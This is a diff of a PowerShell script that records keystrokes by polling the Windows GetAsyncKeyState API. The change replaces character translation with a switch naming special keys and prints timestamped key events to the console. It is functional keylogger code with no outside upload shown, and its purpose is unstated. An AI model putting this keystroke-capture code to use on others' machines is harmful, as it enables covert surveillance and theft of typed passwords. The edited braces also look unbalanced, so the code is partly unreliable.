@@ -23,10 +23,9 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 
 $recording = $true
 while ($recording) {
-  #Start-Sleep -Milliseconds 40
-  
+    
   # scan all ASCII codes above 8
-  for ($ascii = 9; $ascii -le 254; $ascii++) {
+  for ($ascii = 7; $ascii -le 254; $ascii++) {
     # get current key state
     $state = $API::GetAsyncKeyState($ascii)
     #$state
@@ -36,27 +35,34 @@ while ($recording) {
       $null = [console]::CapsLock
 
       # translate scan code to real code
-      $virtualKey = $API::MapVirtualKey($ascii, 3)
-      #$virtualKey
+      
+      # $ascii
 
-      # get keyboard state for virtual keys
-      $kbstate = New-Object Byte[] 256
-      #$kbstate
-      $checkkbstate = $API::GetKeyboardState($kbstate)
-      #$checkkbstate
-
-      # prepare a StringBuilder to receive input key
-      $mychar = New-Object -TypeName System.Text.StringBuilder
-
-      # translate virtual key
-      $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
-
-      if ($success) 
+      switch ($ascii) 
+      # refered to https://docs.microsoft.com/en-us/uwp/api/windows.system.virtualkey?view=winrt-20348
       {
-        
-        (Get-Date -Format FileDateTime) + '-' + $mychar + '-K'
-        #[System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
+         8 { $key = 'Back' ; $newKey = $true }
+         13 { $key = 'Enter' ; $newKey = $true }
+         162 { $key = 'LeftControl' ; $newKey = $true }
+         163 { $key = 'RightControl' ; $newKey = $true }
+         160 { $key = 'LeftShift' ; $newKey = $true }
+         161 { $key = 'RightShift' ; $newKey = $true }
+         27 { $key = 'Escape' ; $newKey = $true }
+         46 { $key = 'Delete' ; $newKey = $true }     
+         9 { $key = 'Tab' ; $newKey = $true } 
+         20 { $key = 'CapitalLock' ; $newKey = $true }
+         164 { $key = 'LeftAlt' ; $newKey = $true } # LeftMenu
+         # 165 { $key = 'RightAlt' ; $newKey = $true } # RightMenu
+      } 
+
+      if ($newKey) {
+        (Get-Date -Format FileDateTime) + '-' + $key + '-KS'
+        $newKey = $false
+      }
+      
       }
     }
+
+    #Start-Sleep -Milliseconds 100
+
   }
-}
